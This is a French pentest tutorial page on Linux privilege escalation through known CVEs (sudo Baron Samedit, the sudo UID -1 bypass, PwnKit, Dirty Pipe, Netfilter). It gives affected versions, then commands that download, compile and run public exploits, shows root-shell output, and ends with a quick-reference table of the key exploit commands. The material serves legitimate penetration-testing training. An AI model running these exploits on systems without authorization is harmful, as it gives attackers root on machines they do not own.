# Vulnerabilites recentes (CVE)

Les vulnerabilites 0-day et les CVE recentes touchant des composants systeme fondamentaux comme sudo, Polkit ou le noyau lui-meme offrent des escalades souvent triviales. Certaines de ces failles sont restees cachees pendant plus de dix ans avant d'etre decouvertes. Cette page couvre les CVE majeures des dernieres annees.

## Pourquoi

En pentest, quand les configurations sont propres (pas de SUID suspect, pas de cron job modifiable, sudo verrouille), les CVE recentes deviennent le dernier recours. Elles sont souvent simples a exploiter (telecharger, compiler, executer) et touchent des composants presents sur presque toutes les distributions Linux. Connaitre ces vulnerabilites est indispensable pour un pentester.

## Comment ca marche

### CVE-2021-3156 (Sudo Baron Samedit)

Une vulnerabilite de type heap-based buffer overflow dans sudo, presente depuis 2011 et decouverte en 2021. Elle affecte les versions de sudo jusqu'a 1.9.5p2.

| Detail | Valeur |
|---|---|
| **CVE** | CVE-2021-3156 |
| **Composant** | sudo |
| **Type** | Heap-based buffer overflow |
| **Versions affectees** | sudo 1.8.2 a 1.8.31p2, 1.9.0 a 1.9.5p1 |
| **Impact** | Escalade locale vers root sans mot de passe |

### CVE-2019-14287 (Sudo Policy Bypass)

Une vulnerabilite dans sudo (< 1.8.28) qui permet de contourner les restrictions de la politique sudo en specifiant un UID negatif (`-1`), qui est interprete comme l'UID 0 (root).

| Detail | Valeur |
|---|---|
| **CVE** | CVE-2019-14287 |
| **Composant** | sudo |
| **Type** | Logic error |
| **Versions affectees** | sudo < 1.8.28 |
| **Prerequis** | L'utilisateur doit avoir au moins une regle sudo |

### CVE-2021-4034 (PwnKit / Polkit pkexec)

Une vulnerabilite de corruption memoire dans `pkexec` (composant de Polkit), presente depuis 2009. `pkexec` est installe par defaut sur quasiment toutes les distributions Linux.

| Detail | Valeur |
|---|---|
| **CVE** | CVE-2021-4034 |
| **Composant** | polkit (pkexec) |
| **Type** | Out-of-bounds write |
| **Impact** | Escalade locale vers root |
| **Particularite** | Exploitable sur presque toutes les distributions, exploit tres fiable |

### CVE-2022-0847 (Dirty Pipe)

Une vulnerabilite dans le mecanisme de pipes du noyau Linux qui permet d'ecrire dans des fichiers en lecture seule. Similaire conceptuellement a Dirty COW (2016).

| Detail | Valeur |
|---|---|
| **CVE** | CVE-2022-0847 |
| **Composant** | Noyau Linux (pipes) |
| **Type** | Ecriture non autorisee dans des fichiers |
| **Versions affectees** | Noyau 5.8 a 5.16.11 / 5.15.25 / 5.10.102 |
| **Impact** | Escalade locale vers root, affecte aussi Android |

### Netfilter (multiples CVE)

Le module noyau Netfilter, qui gere le filtrage de paquets (iptables), a ete touche par plusieurs vulnerabilites entre 2021 et 2023.

| CVE | Annee | Versions affectees |
|---|---|---|
| CVE-2021-22555 | 2021 | Noyau 2.6 a 5.11 |
| CVE-2022-25636 | 2022 | Noyau 5.4 a 5.6.10 |
| CVE-2023-32233 | 2023 | Noyau jusqu'a 6.3.1 |

{% hint style="warning" %}
Les exploits Netfilter sont particulierement instables et peuvent corrompre le noyau, necessitant un redemarrage. A utiliser avec extreme precaution.
{% endhint %}

## En pratique

### Sudo Baron Samedit (CVE-2021-3156)

```bash
# - Verifier la version de sudo
sudo -V | head -n1
# Sudo version 1.8.31

# - Telecharger et compiler l'exploit
git clone https://github.com/blasty/CVE-2021-3156.git
cd CVE-2021-3156
make

# - Lister les cibles disponibles
./sudo-hax-me-a-sandwich
# 0) Ubuntu 18.04.5 - sudo 1.8.21, libc-2.27
# 1) Ubuntu 20.04.1 - sudo 1.8.31, libc-2.31
# 2) Debian 10.0 - sudo 1.8.27, libc-2.28

# - Identifier le systeme
cat /etc/os-release

# - Executer l'exploit avec la cible correspondante
./sudo-hax-me-a-sandwich 1
# ** pray for your rootshell.. **
# # id
# uid=0(root) gid=0(root) groups=0(root)
```

### Sudo Policy Bypass (CVE-2019-14287)

```bash
# - Verifier la version de sudo
sudo -V | head -n1
# Versions < 1.8.28

# - Verifier les regles sudo
sudo -l
# (ALL) /usr/bin/id

# - Exploiter avec un UID negatif
sudo -u#-1 id
# uid=0(root) gid=1005(user) groups=1005(user)

# - Obtenir un shell root (si /bin/bash est autorise)
sudo -u#-1 /bin/bash
```

{% hint style="info" %}
L'UID `-1` est interprete en interne comme `4294967295` (valeur maximale d'un unsigned int 32 bits), puis traite comme `0` (root) par le systeme. Cette faille logique est remarquablement simple a exploiter.
{% endhint %}

### PwnKit (CVE-2021-4034)

```bash
# - Telecharger et compiler le PoC
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
gcc cve-2021-4034-poc.c -o poc

# - Executer
./poc
# # id
# uid=0(root) gid=0(root) groups=0(root)

# - Passer en bash pour un shell interactif
bash
```

{% hint style="success" %}
PwnKit est l'un des exploits les plus fiables. Il fonctionne sur la quasi-totalite des distributions Linux qui ont `pkexec` installe (ce qui est le cas par defaut). C'est souvent le premier exploit a tenter.
{% endhint %}

### Dirty Pipe (CVE-2022-0847)

{% tabs %}
{% tab title="Exploit 1 (modification /etc/passwd)" %}
```bash
# - Verifier la version du noyau
uname -r
# 5.13.0-46-generic (vulnerable)

# - Telecharger et compiler les exploits
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
cd CVE-2022-0847-DirtyPipe-Exploits
bash compile.sh

# - Exploit 1 : modifier /etc/passwd
./exploit-1
# Backing up /etc/passwd to /tmp/passwd.bak
# Setting root password to "piped"...
# Done! Popping shell...
# # id
# uid=0(root)
```
{% endtab %}
{% tab title="Exploit 2 (SUID hijacking)" %}
```bash
# - Trouver des binaires SUID
find / -perm -4000 2>/dev/null

# - Exploit 2 : detourner un binaire SUID
./exploit-2 /usr/bin/sudo
# [+] hijacking suid binary..
# [+] dropping suid shell..
# [+] restoring suid binary..
# [+] popping root shell..
# # id
# uid=0(root)
```
{% endtab %}
{% endtabs %}

### Netfilter (CVE-2021-22555)

```bash
# - Verifier la version du noyau (2.6 a 5.11)
uname -r

# - Telecharger et compiler
wget https://raw.githubusercontent.com/google/security-research/master/pocs/linux/cve-2021-22555/exploit.c
gcc -m32 -static exploit.c -o exploit

# - Executer
./exploit
# [+] Linux Privilege Escalation by theflow@
# ...
# root@target:# id
# uid=0(root) gid=0(root) groups=0(root)
```

## Pieges et galeres

- **Version exacte** : chaque exploit cible des versions precises. Un noyau 5.4 n'est pas forcement vulnerable a un exploit cible pour 5.8+. Toujours verifier la compatibilite
- **Kernel panic** : les exploits noyau (Dirty Pipe, Netfilter) peuvent rendre le systeme instable. En production, documenter la vulnerabilite dans le rapport sans executer l'exploit
- **Exploits Netfilter** : particulierement instables. Le systeme peut necessiter un redemarrage apres un echec
- **Polkit desinstalle** : sur certains systemes minimalistes (conteneurs, appliances), `pkexec` n'est pas installe. PwnKit ne fonctionnera pas
- **Patchs** : ces vulnerabilites sont desormais patchees sur les systemes a jour. Elles restent pertinentes sur les systemes legacy et les environnements non maintenus

## Memo express

| CVE | Composant | Commande cle |
|---|---|---|
| CVE-2021-3156 | sudo | `./sudo-hax-me-a-sandwich <TARGET>` |
| CVE-2019-14287 | sudo | `sudo -u#-1 /bin/bash` |
| CVE-2021-4034 | pkexec | `./poc` |
| CVE-2022-0847 | noyau (pipes) | `./exploit-1` ou `./exploit-2 /usr/bin/sudo` |
| CVE-2021-22555 | netfilter | `./exploit` |
| CVE-2022-25636 | netfilter | `./exploit` |
| CVE-2023-32233 | nf_tables | `./exploit` |
| Verification | sudo | `sudo -V \| head -n1` |
| Verification | noyau | `uname -r` |

***
